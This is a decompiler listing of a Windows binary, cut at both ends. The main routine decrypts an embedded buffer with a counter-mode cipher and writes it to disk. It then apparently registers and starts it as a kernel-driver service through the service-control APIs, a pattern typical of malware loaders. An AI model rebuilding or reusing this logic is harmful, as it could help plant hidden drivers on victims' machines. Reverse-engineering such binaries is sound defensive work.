                                                    *(ulonglong *)(&stack0x000047f8 + lVar20) =
                                                         uVar32;
                                                    *puVar7 = uVar37;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004a57;
                                                    uVar32 = uVar53;
                                                    uVar37 = FUN_140008d14(lVar55,uVar53,lVar55);
                                                    *(ulonglong *)(&stack0x00004808 + lVar20) =
                                                         uVar32;
                                                    *(ulonglong *)(&stack0x00004800 + lVar20) =
                                                         uVar37;
                                                    *(undefined8 *)(&stack0x00004810 + lVar20) = 0;
                                                    *(undefined8 *)(&stack0x00004818 + lVar20) = 0;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004a72;
                                                    uVar37 = FUN_140008ca1(puVar7);
                                                    plVar54 = (longlong *)
                                                              (&stack0x00004660 + lVar20);
                                                    *(undefined8 *)(&stack0x00004680 + lVar20) = 0;
                                                    *(undefined8 *)(&stack0x00004688 + lVar20) = 0;
                                                    *(undefined8 *)(&stack0x00004690 + lVar20) = 0;
                                                    *(undefined8 *)(&stack0x00004698 + lVar20) = 0;
                                                    *(undefined8 *)(&stack0x000046a0 + lVar20) = 0;
                                                    *(ulonglong *)(&stack0x00004668 + lVar20) =
                                                         uVar53;
                                                    *plVar54 = lVar55;
                                                    *(ulonglong *)(&stack0x00004678 + lVar20) =
                                                         uVar32;
                                                    *(ulonglong *)(&stack0x00004670 + lVar20) =
                                                         uVar37;
                                                    lVar57 = 0;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004aad;
                                                    FUN_140008f39(plVar54,0x1400194e0,0);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004ab5;
                                                    FUN_140008ac3(plVar54);
                                                    uVar37 = *(ulonglong *)
                                                              (&stack0x00004d30 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004aca;
                                                    FUN_140008f39(plVar54,lVar33,uVar37);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004ad2;
                                                    FUN_140008ac3(plVar54);
                                                    *puVar4 = 0;
                                                    uVar32 = uVar37 * 8;
                                                    *(ulonglong *)(&stack0x00004a88 + lVar20) =
                                                         (uVar37 & 0x1fffffffffffffff) >> 0x35 |
                                                         (uVar32 & 0xff000000000000) >> 0x28 |
                                                         (uVar32 & 0xff0000000000) >> 0x18 |
                                                         (uVar32 & 0xff00000000) >> 8 |
                                                         (uVar32 & 0xff000000) << 8 |
                                                         (uVar32 & 0xff0000) << 0x18 |
                                                         (uVar32 & 0xff00) << 0x28 | uVar37 << 0x3b;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x10;
                                                    uVar32 = *(ulonglong *)
                                                              ((longlong)&uStack_48 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004af4;
                                                    FUN_140008f39(plVar54,(longlong)puVar4,uVar32);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004afc;
                                                    FUN_140008ac3(plVar54);
                                                    uVar32 = *(ulonglong *)
                                                              (&stack0x00004688 + lVar20);
                                                    uVar37 = *(ulonglong *)
                                                              (&stack0x00004680 + lVar20);
                                                    *(ulonglong *)(&stack0x00004ca8 + lVar20) =
                                                         uVar37 >> 0x38 |
                                                         (uVar37 & 0xff000000000000) >> 0x28 |
                                                         (uVar37 & 0xff0000000000) >> 0x18 |
                                                         (uVar37 & 0xff00000000) >> 8 |
                                                         (uVar37 & 0xff000000) << 8 |
                                                         (uVar37 & 0xff0000) << 0x18 |
                                                         (uVar37 & 0xff00) << 0x28 | uVar37 << 0x38;
                                                    *(ulonglong *)(&stack0x00004ca0 + lVar20) =
                                                         uVar32 >> 0x38 |
                                                         (uVar32 & 0xff000000000000) >> 0x28 |
                                                         (uVar32 & 0xff0000000000) >> 0x18 |
                                                         (uVar32 & 0xff00000000) >> 8 |
                                                         (uVar32 & 0xff000000) << 8 |
                                                         (uVar32 & 0xff0000) << 0x18 |
                                                         (uVar32 & 0xff00) << 0x28 | uVar32 << 0x38;
                                                    *(undefined8 *)(&stack0x00004830 + lVar20) = 0;
                                                    *(undefined8 *)(&stack0x00004838 + lVar20) = 0;
                                                    *(undefined8 *)(&stack0x00004820 + lVar20) = 0;
                                                    *(undefined8 *)(&stack0x00004828 + lVar20) = 0;
                                                    *(undefined8 *)(&stack0x00004810 + lVar20) = 0;
                                                    *(undefined8 *)(&stack0x00004818 + lVar20) = 0;
                                                    *(undefined8 *)(&stack0x00004800 + lVar20) = 0;
                                                    *(undefined8 *)(&stack0x00004808 + lVar20) = 0;
                                                    *puVar7 = 0;
                                                    *(undefined8 *)(&stack0x000047f8 + lVar20) = 0;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x50;
                                                    puVar60 = &stack0x000047f0 + lVar20;
                                                    for (lVar55 = *(longlong *)
                                                                   ((longlong)&uStack_48 + lVar20);
                                                        lVar55 != 0; lVar55 = lVar55 + -1) {
                                                      *(undefined1 *)plVar54 = *puVar60;
                                                      puVar60 = puVar60 + 1;
                                                      plVar54 = (longlong *)((longlong)plVar54 + 1);
                                                    }
                                                    for (; lVar57 != 0x10; lVar57 = lVar57 + 1) {
                                                      (&stack0x00004ca0)[lVar57 + lVar20] =
                                                           (&stack0x00004ca0)[lVar57 + lVar20] ^
                                                           (&stack0x00004ce8)[lVar57 + lVar20];
                                                    }
                                                    *(undefined8 *)(&stack0x00004a10 + lVar20) =
                                                         *(undefined8 *)(&stack0x00004ca0 + lVar20);
                                                    *(undefined8 *)(&stack0x00004a18 + lVar20) =
                                                         *(undefined8 *)(&stack0x00004ca8 + lVar20);
                                                    bVar48 = 0;
                                                    for (lVar55 = 0; lVar55 != 0x10;
                                                        lVar55 = lVar55 + 1) {
                                                      bVar48 = bVar48 | (&DAT_14002d6f0)[lVar55] ^
                                                                        (&stack0x00004a10)
                                                                        [lVar55 + lVar20];
                                                    }
                                                    if (bVar48 != 0) {
                                                      *(undefined8 *)(&stack0x00004ca0 + lVar20) = 0
                                                      ;
                                                      *(undefined8 *)(&stack0x00004ca8 + lVar20) = 0
                                                      ;
LAB_140004ba0:
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004bba;
                                                      FUN_140007021((undefined8 *)&DAT_1400172b0,
                                                                    *(undefined8 *)
                                                                     (&stack0x00004d10 + lVar20),
                                                                    *(longlong *)
                                                                     (&stack0x00004d30 + lVar20));
                                                      goto LAB_140004bba;
                                                    }
                                                    *(undefined4 *)(&stack0x00004c5c + lVar20) =
                                                         0x2000000;
                                                    uVar32 = *(ulonglong *)
                                                              (&stack0x00004c50 + lVar20);
                                                    uVar37 = *(ulonglong *)
                                                              (&stack0x00004c58 + lVar20);
                                                    uVar58 = uVar32 >> 0x38 |
                                                             (uVar32 & 0xff000000000000) >> 0x28 |
                                                             (uVar32 & 0xff0000000000) >> 0x18 |
                                                             (uVar32 & 0xff00000000) >> 8 |
                                                             (uVar32 & 0xff000000) << 8 |
                                                             (uVar32 & 0xff0000) << 0x18 |
                                                             (uVar32 & 0xff00) << 0x28 |
                                                             uVar32 << 0x38;
                                                    uVar53 = uVar37 >> 0x38 |
                                                             (uVar37 & 0xff000000000000) >> 0x28 |
                                                             (uVar37 & 0xff0000000000) >> 0x18 |
                                                             (uVar37 & 0xff00000000) >> 8 |
                                                             (uVar37 & 0xff000000) << 8 |
                                                             (uVar37 & 0xff0000) << 0x18 |
                                                             (uVar37 & 0xff00) << 0x28 |
                                                             uVar37 << 0x38;
                                                    if (*(ulonglong *)(&stack0x00004d30 + lVar20) <
                                                        0x10) {
                                                      uVar52 = 0;
                                                    }
                                                    else {
                                                      uVar52 = 0;
                                                      while( true ) {
                                                        uVar37 = uVar53 >> 0x38 |
                                                                 (uVar53 & 0xff000000000000) >> 0x28
                                                                 | (uVar53 & 0xff0000000000) >> 0x18
                                                                 | (uVar53 & 0xff00000000) >> 8 |
                                                                 (uVar53 & 0xff000000) << 8 |
                                                                 (uVar53 & 0xff0000) << 0x18 |
                                                                 (uVar53 & 0xff00) << 0x28 |
                                                                 uVar53 << 0x38;
                                                        uVar32 = uVar58 >> 0x38 |
                                                                 (uVar58 & 0xff000000000000) >> 0x28
                                                                 | (uVar58 & 0xff0000000000) >> 0x18
                                                                 | (uVar58 & 0xff00000000) >> 8 |
                                                                 (uVar58 & 0xff000000) << 8 |
                                                                 (uVar58 & 0xff0000) << 0x18 |
                                                                 (uVar58 & 0xff00) << 0x28 |
                                                                 uVar58 << 0x38;
                                                        if (*(ulonglong *)
                                                             (&stack0x00004d30 + lVar20) <
                                                            uVar52 + 0x10) break;
                                                        bVar61 = 0xfffffffffffffffe < uVar53;
                                                        uVar53 = uVar53 + 1;
                                                        uVar58 = uVar58 + bVar61;
                                                        *(ulonglong *)(&stack0x000047f0 + lVar20) =
                                                             uVar32;
                                                        *(ulonglong *)(&stack0x000047f8 + lVar20) =
                                                             uVar37;
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140004c61;
                                                        FUN_1400086e6((uint *)(&stack0x00004b30 +
                                                                              lVar20),
                                                                      (byte *)(*(longlong *)
                                                                                (&stack0x00004d10 +
                                                                                lVar20) + uVar52),
                                                                      (byte *)(uVar52 + lVar33),
                                                                      (uint *)(&stack0x000047f0 +
                                                                              lVar20));
                                                        uVar52 = uVar52 + 0x10;
                                                      }
                                                    }
                                                    while (uVar52 + 0x10 <=
                                                           *(ulonglong *)(&stack0x00004d30 + lVar20)
                                                          ) {
                                                      *(ulonglong *)(&stack0x00004aa0 + lVar20) =
                                                           uVar32;
                                                      *(ulonglong *)(&stack0x00004aa8 + lVar20) =
                                                           uVar37;
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004c9c;
                                                      FUN_1400086e6((uint *)(&stack0x00004b30 +
                                                                            lVar20),
                                                                    (byte *)(*(longlong *)
                                                                              (&stack0x00004d10 +
                                                                              lVar20) + uVar52),
                                                                    (byte *)(uVar52 + lVar33),
                                                                    (uint *)(&stack0x00004aa0 +
                                                                            lVar20));
                                                      bVar61 = 0xfffffffffffffffe < uVar53;
                                                      uVar53 = uVar53 + 1;
                                                      uVar58 = uVar58 + bVar61;
                                                      uVar32 = uVar58 >> 0x38 |
                                                               (uVar58 & 0xff000000000000) >> 0x28 |
                                                               (uVar58 & 0xff0000000000) >> 0x18 |
                                                               (uVar58 & 0xff00000000) >> 8 |
                                                               (uVar58 & 0xff000000) << 8 |
                                                               (uVar58 & 0xff0000) << 0x18 |
                                                               (uVar58 & 0xff00) << 0x28 |
                                                               uVar58 << 0x38;
                                                      uVar37 = uVar53 >> 0x38 |
                                                               (uVar53 & 0xff000000000000) >> 0x28 |
                                                               (uVar53 & 0xff0000000000) >> 0x18 |
                                                               (uVar53 & 0xff00000000) >> 8 |
                                                               (uVar53 & 0xff000000) << 8 |
                                                               (uVar53 & 0xff0000) << 0x18 |
                                                               (uVar53 & 0xff00) << 0x28 |
                                                               uVar53 << 0x38;
                                                      uVar52 = uVar52 + 0x10;
                                                    }
                                                    lVar55 = *(ulonglong *)
                                                              (&stack0x00004d30 + lVar20) - uVar52;
                                                    if (uVar52 <= *(ulonglong *)
                                                                   (&stack0x00004d30 + lVar20) &&
                                                        lVar55 != 0) {
                                                      pbVar8 = &stack0x000043f0 + lVar20;
                                                      pbVar8[0] = 0;
                                                      pbVar8[1] = 0;
                                                      pbVar8[2] = 0;
                                                      pbVar8[3] = 0;
                                                      pbVar8[4] = 0;
                                                      pbVar8[5] = 0;
                                                      pbVar8[6] = 0;
                                                      pbVar8[7] = 0;
                                                      *(undefined8 *)(&stack0x000043f8 + lVar20) = 0
                                                      ;
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004cee;
                                                      FUN_14000d5a5((longlong)pbVar8,lVar33 + uVar52
                                                                    ,lVar55);
                                                      *(ulonglong *)(&stack0x000047f8 + lVar20) =
                                                           uVar37;
                                                      *(ulonglong *)(&stack0x000047f0 + lVar20) =
                                                           uVar32;
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004d0e;
                                                      FUN_1400086e6((uint *)(&stack0x00004b30 +
                                                                            lVar20),pbVar8,pbVar8,
                                                                    (uint *)(&stack0x000047f0 +
                                                                            lVar20));
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004d23;
                                                      FUN_14000d5a5(uVar52 + *(longlong *)
                                                                              (&stack0x00004d10 +
                                                                              lVar20),
                                                                    (longlong)pbVar8,lVar55);
                                                    }
                                                    *(undefined8 *)
                                                     (&stack0xfffffffffffffff0 + lVar20) = 0;
                                                    *(undefined4 *)
                                                     (&stack0xffffffffffffffe8 + lVar20) = 0x80;
                                                    *(undefined4 *)
                                                     (&stack0xffffffffffffffe0 + lVar20) = 2;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004d53;
                                                    pvVar35 = CreateFileA(&DAT_1400349a0,0x40000000,
                                                                          0,(LPSECURITY_ATTRIBUTES)
                                                                            0x0,*(DWORD *)(&
                                                  stack0xffffffffffffffe0 + lVar20),
                                                  *(DWORD *)(&stack0xffffffffffffffe8 + lVar20),
                                                  *(HANDLE *)(&stack0xfffffffffffffff0 + lVar20));
                                                  if (pvVar35 == (HANDLE)0xffffffffffffffff)
                                                  goto LAB_140004ba0;
                                                  *(DWORD *)(&stack0x00004c80 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0xffffffffffffffe0 + lVar20)
                                                       = 0;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004d87;
                                                  BVar30 = WriteFile(pvVar35,*(LPCVOID *)
                                                                              (&stack0x00004d10 +
                                                                              lVar20),
                                                                     (DWORD)*(undefined8 *)
                                                                             (&stack0x00004d30 +
                                                                             lVar20),
                                                                     (LPDWORD)(&stack0x00004c80 +
                                                                              lVar20),
                                                                     *(LPOVERLAPPED *)
                                                                      (&stack0xffffffffffffffe0 +
                                                                      lVar20));
                                                  if (BVar30 == 0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140005379;
                                                    CloseHandle(pvVar35);
                                                    goto LAB_140004ba0;
                                                  }
                                                  uVar27 = *(uint *)(&stack0x00004c80 + lVar20);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004d9e;
                                                  CloseHandle(pvVar35);
                                                  uVar32 = *(ulonglong *)(&stack0x00004d30 + lVar20)
                                                  ;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004dbe;
                                                  FUN_140007021((undefined8 *)&DAT_1400172b0,
                                                                *(undefined8 *)
                                                                 (&stack0x00004d10 + lVar20),uVar32)
                                                  ;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004dcc;
                                                  FUN_140007021((undefined8 *)&DAT_1400172b0,lVar33,
                                                                uVar32);
                                                  if (uVar32 == uVar27) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004dda;
                                                    FUN_14000691f();
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004dea;
                                                    lVar33 = (*DAT_140034038)(0,0,0xf003f);
                                                    if (lVar33 != 0) {
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004dfb;
                                                      FUN_14000691f();
                                                      *(undefined8 *)
                                                       ((longlong)auStackX_8 + lVar20 + 8) = 0;
                                                      *(undefined8 *)
                                                       ((longlong)auStackX_8 + lVar20 + 0x10) = 0;
                                                      puVar2 = (undefined8 *)
                                                               ((longlong)auStackX_8 + lVar20 + -8);
                                                      *puVar2 = 0;
                                                      puVar2[1] = 0;
                                                      *(undefined8 *)
                                                       ((longlong)auStackX_8 + lVar20 + 0x18) = 0;
                                                      *(undefined4 *)
                                                       (&stack0xfffffffffffffff0 + lVar20) = 0;
                                                      *(undefined **)
                                                       (&stack0xfffffffffffffff8 + lVar20) =
                                                           &DAT_1400349a0;
                                                      *(undefined4 *)
                                                       (&stack0xffffffffffffffe8 + lVar20) = 3;
                                                      *(undefined4 *)
                                                       (&stack0xffffffffffffffe0 + lVar20) = 1;
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004e41;
                                                      lVar55 = (*DAT_140034040)(lVar33,&
                                                  DAT_140034aa4,&DAT_140034aa4);
                                                  if (lVar55 == 0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140005383;
                                                    DVar26 = GetLastError();
                                                    if (DVar26 == 0x431) {
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x1400053a0;
                                                      lVar55 = (*DAT_140034048)(lVar33,&
                                                  DAT_140034aa4,0xf01ff);
                                                  if (lVar55 != 0) goto LAB_140004e4a;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x1400053ae;
                                                  GetLastError();
                                                  }
LAB_1400053ee:
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x1400053f7;
                                                  (*DAT_140034058)(lVar33);
                                                  goto LAB_140002cad;
                                                  }
LAB_140004e4a:
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004e5b;
                                                  iVar29 = (*DAT_140034050)(lVar55,0,0);
                                                  if (iVar29 == 0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400053b5;
                                                    DVar26 = GetLastError();
                                                    if ((DVar26 != 0xb7) && (DVar26 != 0x420)) {
                                                      *(undefined8 *)(&stack0x0000403c + lVar20) = 0
                                                      ;
                                                      *(undefined8 *)(&stack0x00004044 + lVar20) = 0
                                                      ;
                                                      *(undefined8 *)(&stack0x00004030 + lVar20) = 0
                                                      ;
                                                      *(undefined8 *)(&stack0x00004038 + lVar20) = 0
                                                      ;
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x1400053e5;
                                                      (*DAT_140034060)(lVar55);
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x1400053ee;
                                                      (*DAT_140034058)(lVar55);
                                                      goto LAB_1400053ee;
                                                    }
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004e6c;
                                                  (*DAT_140034058)(lVar55);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004e75;
                                                  (*DAT_140034058)(lVar33);
                                                  goto LAB_140004e75;
                                                  }
                                                  }
                                                  }
                                                  else {
LAB_140004bba:
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004bd0;
                                                    FUN_140007021((undefined8 *)&DAT_1400172b0,
                                                                  lVar33,*(longlong *)
                                                                          (&stack0x00004d30 + lVar20
                                                                          ));
                                                  }
LAB_140004bd0:
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004bd5;
                                                  GetLastError();
                                                  goto LAB_140002cad;
                                                  }
                                                  }
                                                  }
                                                }
                                              }
                                            }
                                            *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                 0x1400046d3;
                                            free(pvVar42);
                                          }
                                          *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                               0x1400046df;
                                          (*DAT_140034268)(pvVar35);
                                        }
                                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x1400046e8
                                        ;
                                        (*DAT_140034260)(pvVar35);
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    goto LAB_140002cad;
  }
  goto LAB_140002c97;
LAB_140002c91:
  lVar33 = lVar33 + 0x1c;
  goto LAB_140002c72;
}


// ==== FUN_1400053fc @ 1400053fc size 32

longlong FUN_1400053fc(longlong param_1)

{
  FUN_14000d53c(param_1);
  return param_1;
}


// ==== FUN_14000541c @ 14000541c size 160

short FUN_14000541c(undefined8 *param_1,longlong param_2,ulonglong param_3)

{
  longlong lVar1;
  ulonglong uVar2;
  longlong local_60;
  short local_58;
  longlong local_50;
  longlong local_48;
  
  uVar2 = 0;
  do {
    lVar1 = param_3 - uVar2;
    if (param_3 < uVar2 || lVar1 == 0) {
      return 0;
    }
    if ((ulonglong)param_1[2] < (ulonglong)(param_1[3] + lVar1)) {
      local_50 = param_2 + uVar2;
      local_48 = lVar1;
      (**(code **)*param_1)(&local_60,param_1,&local_50,1,1);
      lVar1 = local_60;
      if (local_58 != 0) {
        return local_58;
      }
    }
    else {
      FUN_14000d5a5(param_1[3] + param_1[1],param_2 + uVar2,lVar1);
      param_1[3] = param_1[3] + lVar1;
    }
    uVar2 = uVar2 + lVar1;
  } while( true );
}


// ==== FUN_1400054bc @ 1400054bc size 19

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 * FUN_1400054bc(undefined8 *param_1)

{
  undefined8 uVar1;
  
  uVar1 = _UNK_140017370;
  *param_1 = _DAT_140017368;
  param_1[1] = uVar1;
  return param_1;
}


// ==== FUN_1400054cf @ 1400054cf size 10

undefined2 FUN_1400054cf(void)

{
  return 4;
}


// ==== FUN_1400054d9 @ 1400054d9 size 8

undefined8 FUN_1400054d9(void)

{
  return 0;
}


// ==== FUN_1400054e1 @ 1400054e1 size 265

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 * FUN_1400054e1(undefined8 *param_1,longlong param_2,longlong param_3,longlong param_4)

{
  longlong lVar1;
  ulonglong uVar2;
  undefined1 *puVar3;
  ulonglong *puVar4;
  undefined8 *puVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  undefined8 *puVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  
  if (param_4 == 0) {
    *param_1 = 0;
    param_1[1] = 0;
  }
  else {
    lVar1 = param_4 + -1;
    puVar4 = (ulonglong *)(param_3 + 8);
    do {
      puVar8 = (undefined8 *)(*(longlong *)(param_2 + 8) + *(longlong *)(param_2 + 0x18));
      uVar6 = *(longlong *)(param_2 + 0x10) - *(longlong *)(param_2 + 0x18);
      param_4 = param_4 + -1;
      if (param_4 == 0) {
        puVar5 = (undefined8 *)(lVar1 * 0x10);
        uVar2 = *(ulonglong *)(param_3 + 8 + (longlong)puVar5);
        if (uVar2 == 0) {
          puVar8 = puVar5;
          uVar9 = 0;
          uVar10 = 0;
          uVar11 = 0;
          uVar12 = 0;
        }
        else {
          puVar3 = *(undefined1 **)(param_3 + (longlong)puVar5);
          puVar5 = puVar8;
          if (uVar2 == 1) {
            FUN_14000d550((longlong)puVar8,*puVar3,uVar6);
            *(longlong *)(param_2 + 0x18) = *(longlong *)(param_2 + 0x18) + uVar6;
            uVar9 = _DAT_140017378;
            uVar10 = _UNK_14001737c;
            uVar11 = _UNK_140017380;
            uVar12 = _UNK_140017384;
          }
          else {
            do {
              uVar7 = uVar6;
              if (uVar2 < uVar6) {
                uVar7 = uVar2;
              }
              uVar6 = -(uVar2 - uVar6);
              puVar8 = puVar5;
              FUN_14000d5a5((longlong)puVar5,(longlong)puVar3,uVar7);
              *(longlong *)(param_2 + 0x18) = *(longlong *)(param_2 + 0x18) + uVar7;
              puVar5 = (undefined8 *)((longlong)puVar5 + uVar2);
              uVar9 = _DAT_140017378;
              uVar10 = _UNK_14001737c;
              uVar11 = _UNK_140017380;
              uVar12 = _UNK_140017384;
            } while (!CARRY8(uVar2,uVar6));
          }
        }
        break;
      }
      uVar2 = *puVar4;
      uVar7 = uVar6;
      if (uVar2 < uVar6) {
        uVar7 = uVar2;
      }
      FUN_14000d5a5((longlong)puVar8,puVar4[-1],uVar7);
      *(longlong *)(param_2 + 0x18) = *(longlong *)(param_2 + 0x18) + uVar7;
      puVar4 = puVar4 + 2;
      uVar9 = _DAT_140017378;
      uVar10 = _UNK_14001737c;
      uVar11 = _UNK_140017380;
      uVar12 = _UNK_140017384;
    } while (uVar2 <= uVar6);
    *(undefined4 *)param_1 = uVar9;
    *(undefined4 *)((longlong)param_1 + 4) = uVar10;
    *(undefined4 *)(param_1 + 1) = uVar11;
    *(undefined4 *)((longlong)param_1 + 0xc) = uVar12;
    param_1 = puVar8;
  }
  return param_1;
}


// ==== FUN_1400055ea @ 1400055ea size 233

void FUN_1400055ea(undefined8 *param_1,longlong param_2,ulonglong param_3,longlong param_4)

{
  undefined1 uVar1;
  short sVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  
  uVar3 = param_3;
  if (*(char *)(param_4 + 0x18) != '\0') {
    uVar3 = *(ulonglong *)(param_4 + 0x10);
  }
  uVar4 = 0;
  if (param_3 <= uVar3) {
    uVar4 = uVar3 - param_3;
  }
  if (param_3 <= uVar3 && uVar3 - param_3 != 0) {
    uVar1 = *(undefined1 *)(param_4 + 0x21);
    if ((*(byte *)(param_4 + 0x20) & 3) != 2) {
      if ((*(byte *)(param_4 + 0x20) & 3) == 1) {
        sVar2 = FUN_140005807(param_1,uVar1,uVar4 >> 1);
        if ((sVar2 == 0) && (sVar2 = FUN_14000541c(param_1,param_2,param_3), sVar2 == 0)) {
          uVar4 = uVar4 + 1 >> 1;
LAB_1400056ab:
          FUN_140005807(param_1,uVar1,uVar4);
          return;
        }
      }
      else {
        sVar2 = FUN_14000541c(param_1,param_2,param_3);
        if (sVar2 == 0) goto LAB_1400056ab;
      }
      return;
    }
    sVar2 = FUN_140005807(param_1,uVar1,uVar4);
    if (sVar2 != 0) {
      return;
    }
  }
  FUN_14000541c(param_1,param_2,param_3);
  return;
}


// ==== FUN_1400056d3 @ 1400056d3 size 308

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_1400056d3(longlong param_1,longlong param_2,ulonglong param_3)

{
  char *pcVar1;
  ulonglong uVar2;
  longlong lVar3;
  ulonglong uVar4;
  undefined1 *puVar5;
  uint *puVar6;
  uint *puVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  bool bVar10;
  uint local_248 [60];
  uint local_158 [60];
  byte local_68 [16];
  undefined8 local_58;
  undefined8 uStack_50;
  longlong local_48;
  
  if (DAT_1400341d0 == '\0') {
    FUN_140006155(local_248,(uint *)&DAT_140017388);
    puVar6 = local_248;
    puVar5 = &DAT_1400340e0;
    for (lVar3 = 0xf0; lVar3 != 0; lVar3 = lVar3 + -1) {
      *puVar5 = (char)*puVar6;
      puVar6 = (uint *)((longlong)puVar6 + 1);
      puVar5 = puVar5 + 1;
    }
    DAT_1400341d0 = '\x01';
  }
  else {
    puVar5 = &DAT_1400340e0;
    puVar6 = local_248;
    for (lVar3 = 0xf0; lVar3 != 0; lVar3 = lVar3 + -1) {
      *(undefined1 *)puVar6 = *puVar5;
      puVar5 = puVar5 + 1;
      puVar6 = (uint *)((longlong)puVar6 + 1);
    }
  }
  puVar6 = local_248;
  puVar7 = local_158;
  for (lVar3 = 0xf0; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(char *)puVar7 = (char)*puVar6;
    puVar6 = (uint *)((longlong)puVar6 + 1);
    puVar7 = (uint *)((longlong)puVar7 + 1);
  }
  local_58 = _DAT_1400173a8;
  uStack_50 = _UNK_1400173b0;
  uVar8 = 0;
  uVar4 = param_3;
  local_48 = param_1;
  do {
    uVar9 = 0x10;
    if (uVar4 < 0x10) {
      uVar9 = uVar4;
    }
    if (param_3 <= uVar8) {
      *(undefined1 *)(local_48 + param_3) = 0;
      return;
    }
    FUN_1400058a8(local_158,(undefined8 *)local_68,(uint *)&local_58);
    lVar3 = 0xf;
    do {
      pcVar1 = (char *)((longlong)&local_58 + lVar3);
      *pcVar1 = *pcVar1 + '\x01';
      bVar10 = lVar3 == 0;
      lVar3 = lVar3 + -1;
      if (bVar10) break;
    } while (*pcVar1 == '\0');
    for (uVar2 = 0; uVar9 != uVar2; uVar2 = uVar2 + 1) {
      *(byte *)(param_1 + uVar2) = local_68[uVar2] ^ *(byte *)(param_2 + uVar2);
    }
    uVar8 = uVar8 + 0x10;
    uVar4 = uVar4 - 0x10;
    param_2 = param_2 + 0x10;
    param_1 = param_1 + 0x10;
  } while( true );
}


// ==== FUN_140005807 @ 140005807 size 161

short FUN_140005807(undefined8 *param_1,undefined1 param_2,longlong param_3)

{
  longlong lVar1;
  longlong local_68;
  short local_60;
  undefined1 *local_58;
  undefined8 local_50;
  undefined1 local_41;
  
  do {
    if (param_3 == 0) {
      return 0;
    }
    if ((ulonglong)param_1[2] < (ulonglong)(param_1[3] + param_3)) {
      local_50 = 1;
      local_58 = &local_41;
      local_41 = param_2;
      (**(code **)*param_1)(&local_68,param_1,&local_58,1,param_3);
      lVar1 = local_68;
      if (local_60 != 0) {
        return local_60;
      }
    }
    else {
      FUN_14000d550(param_1[3] + param_1[1],param_2,param_3);
      param_1[3] = param_1[3] + param_3;
      lVar1 = param_3;
    }
    param_3 = param_3 - lVar1;
  } while( true );
}


// ==== FUN_1400058a8 @ 1400058a8 size 713

void FUN_1400058a8(uint *param_1,undefined8 *param_2,uint *param_3)

{
  undefined8 local_2e8;
  undefined8 uStack_2e0;
  undefined8 local_2d8;
  undefined8 uStack_2d0;
  undefined8 local_2c8;
  undefined8 uStack_2c0;
  undefined8 local_2b8;
  undefined8 uStack_2b0;
  undefined8 local_2a8;
  undefined8 uStack_2a0;
  undefined8 local_298;
  undefined8 uStack_290;
  undefined8 local_288;
  undefined8 uStack_280;
  undefined8 local_278;
  undefined8 uStack_270;
  undefined8 local_268;
  undefined8 uStack_260;
  undefined8 local_258;
  undefined8 uStack_250;
  undefined8 local_248;
  undefined8 uStack_240;
  undefined8 local_238;
